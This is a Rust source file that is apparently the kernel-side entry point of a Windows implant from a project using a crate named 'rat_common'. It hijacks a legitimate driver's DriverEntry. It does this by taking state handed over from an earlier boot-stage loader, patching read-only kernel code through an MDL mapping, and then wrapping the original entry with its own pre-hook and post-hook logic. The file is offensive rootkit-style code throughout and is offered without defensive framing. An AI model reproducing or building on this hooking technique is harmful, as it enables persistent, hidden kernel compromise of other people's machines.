#![no_std]

extern crate alloc;
extern crate wdk_panic;

mod driver;
mod global;
mod handlers;
mod logger;
mod string;
mod threads;
mod wrappers;

use core::{mem, slice};

use log::LevelFilter;
use rat_common::windows::kernel::KernelHandoff;
use wdk_alloc::WdkAllocator;
use wdk_sys::{
    NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL,
};

use crate::wrappers::mdl::MdlGuard;

#[global_allocator]
static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;

type DriverEntryFn =
    unsafe extern "system" fn(driver: PDRIVER_OBJECT, registry_path: PCUNICODE_STRING) -> NTSTATUS;

/// # Safety
/// This function is called by ntoskrnl during `KiSystemStartup`, following Windows x64 calling convention.
#[unsafe(export_name = "DriverEntry")]
pub unsafe extern "system" fn driver_entry(
    driver: PDRIVER_OBJECT,
    registry_path: PCUNICODE_STRING,
    extra: *const KernelHandoff,
) -> NTSTATUS {
    // Log to COM2 port
    com_logger::builder()
        .base(0x2f8)
        .filter(LevelFilter::Trace)
        .setup();

    info!("Running hooked DriverEntry...");

    if extra.is_null() {
        return STATUS_INVALID_PARAMETER;
    }

    let extra = unsafe { extra.read_unaligned() };

    // Recover original instructions
    // Use an MDL to create a writable system mapping for the read-only executable memory.
    if !extra.driver_entry.address.is_null()
        && !extra.driver_entry.instructions.is_null()
        && extra.driver_entry.instructions_len > 0
    {
        match unsafe {
            MdlGuard::new(
                extra.driver_entry.address.cast(),
                extra.driver_entry.instructions_len as u32,
            )
        } {
            Ok(mut mdl) => {
                mdl.as_mut_slice().copy_from_slice(unsafe {
                    slice::from_raw_parts(
                        extra.driver_entry.instructions,
                        extra.driver_entry.instructions_len,
                    )
                });
            }
            Err(e) => {
                error!("Unable to overwrite original instructions: {e}");
                return STATUS_UNSUCCESSFUL;
            }
        }
    } else {
        error!("Original instructions info is missing or invalid");
        return STATUS_INVALID_PARAMETER;
    }

    let registry_path_ref = match unsafe { registry_path.as_ref() } {
        Some(s) => unsafe { string::to_utf16str(s) },
        None => None,
    };

    // Invoke our pre-hook logic
    if let Err(e) = driver::driver_entry_prehook(driver, registry_path_ref, &extra) {
        error!("DriverEntry pre-hook error: {e}");
    }

    // Call the original DriverEntry
    info!(
        "Calling original DriverEntry at {:p}...",
        extra.driver_entry.address,
    );
    let status = unsafe {
        let original_fn = mem::transmute::<*mut u8, DriverEntryFn>(extra.driver_entry.address);
        original_fn(driver, registry_path)
    };

    // Invoke our post-hook logic
    if let Err(e) = driver::driver_entry_posthook(driver, registry_path_ref, status, &extra) {
        error!("DriverEntry post-hook error: {e}");
    }
    status
}
